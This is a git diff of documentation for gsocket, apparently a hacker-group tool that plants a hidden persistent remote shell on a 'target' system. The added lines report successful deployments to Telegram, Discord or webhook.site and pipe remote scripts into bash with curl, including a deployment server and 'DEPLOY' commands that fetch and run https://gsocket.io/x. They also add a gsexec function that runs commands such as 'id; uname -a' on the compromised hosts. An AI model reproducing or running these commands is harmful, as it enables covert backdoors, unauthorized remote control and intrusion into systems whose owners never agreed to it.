@@ -148,6 +148,10 @@ Useful environment variables:
 |GS_HIDDEN_NAME=|Use a custom hidden process name.|
 |GS_HOST=|Use a specific GSRN server (or [your own relay](https://github.com/hackerschoice/gsocket-relay/blob/main/README2.md)). Try GS_HOST=1.2.3.4|
 |GS_PORT=|Use a specific GSRN port. Try any of 22,53,67,443,7350|
+|GS_TG_TOKEN=|Telegram Bot Key for reporting successfull deployments.|
+|GS_TG_CHATID=|Telegram Chat ID.|
+|GS_DISCORD_KEY=|Report to Discord|
+|GS_WEBHOOK_KEY=|Report to webhook.site|
 |TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|
 
 If all fails:
@@ -173,7 +177,7 @@ echo "Connect with: gs-netcat -s $SECRET -i"
             <label for="wget-manual" class="tab-label">Wget</label>
             <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
 {% highlight shell %}
-wget --no-check-certificate -qO- https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
+wget -qO- https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
 SECRET=$(/bin/gs-netcat -g)
 GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
 echo "Connect with: gs-netcat -s $SECRET -i" 
@@ -187,78 +191,50 @@ echo "Connect with: gs-netcat -s $SECRET -i"
 ## Advanced Tips & Tricks
 {: refdef}
 
-Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.
+### 1. Run your own Deployment Server  
+This method logs each successful deployment. The 1-line command creates an ephemeral and public facing HTTPS tunnel (via Cloudflare) so that your server can be behind NAT/Firewall:
 
-<div class="tabs-wrapper">
-    <div class="tabs" style="height: 35.45rem;">
-        <div class="tab">
-            <input type="radio" name="css-tabs-advanced" id="curl-advanced" class="tab-switch" checked>
-            <label for="curl-advanced" class="tab-label">Curl</label>
-            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
+{% highlight sh %}
+LOG=results.log bash -c "$(curl -fsSL https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy_server.sh)"
+{% endhighlight %}
+
+### 2. Execute a remote command  
+
 {% highlight sh %}
 # cut & paste this into your shell on your workstation or add to ~/.bashrc
-gssec()
-{
+gsexec(){
+    echo "$2; exit; __START"|gs-netcat -s "$1" 2>/dev/null|sed -n '/__START/,$p'|tail +2
+}
+{% endhighlight %}
+
+Then execute a remote command like this:
+{% highlight sh %}
+gsexec MySecretChangeMe "id; uname -a"
+{% endhighlight %}
+
+### 3. Managing Secrets  
+Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.
+
+{% highlight sh %}
+# cut & paste this into your shell on your workstation or add to ~/.bashrc
+gssec() {
+    [[ -z $GS_SEED ]] && { echo >&2 "Please type: GS_SEED=MySuperStrongMasterSeed"; return 255; }
     str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
     str="${str:0:22}"
     echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'
     echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL https://gsocket.io/x)"'
     echo "ACCESS: gs-netcat -s ${str} -i"
 }
-
-# Pick a STRONG master seed:
-[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
 {% endhighlight %}
 {% highlight sh %}
-# Generate a SECRET based on the SEED and 'alice.com'
-$ gssec alice.com # You only need to know "alice.com" to connect.
+# Generate a SECRET for 'alice.com'
+gssec alice.com # You only need to know "alice.com" to connect.
 
 # Output from above's command:
 DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/x)"
 ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL https://gsocket.io/x)"
 ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
 {% endhighlight %}
-            </div>
-        </div>
-        <div class="tab">
-            <input type="radio" name="css-tabs-advanced" id="wget-advanced" class="tab-switch">
-            <label for="wget-advanced" class="tab-label">Wget</label>
-            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
-{% highlight sh %}
-# cut & paste this into your shell on your workstation or add to ~/.bashrc
-gssec()
-{
-    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
-    str="${str:0:22}"
-    echo "DEPLOY: X=${str}"' bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"'
-    echo "ACCESS: S=${str}"' bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"'
-    echo "ACCESS: gs-netcat -s ${str} -i"
-}
-
-# Pick a STRONG master seed:
-[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
-{% endhighlight %}
-{% highlight sh %}
-# Generate a SECRET based on the SEED and 'alice.com'
-$ gssec alice.com # You only need to know "alice.com" to connect.
-
-# Output from above's command:
-DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
-ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
-ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
-{% endhighlight %}
-            </div>
-        </div>
-    </div>
-</div>
-
-Execute a single command (e.g. `id`) on a remote system:
-
-<div class="code-container">
-{% highlight sh %}
-echo 'id; exit; __START' | gs-netcat -s ExampleSecretChangeMe 2>/dev/null | sed -n '/__START/,$p' | tail +2
-{% endhighlight %}
-</div>
 
 <p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>
 
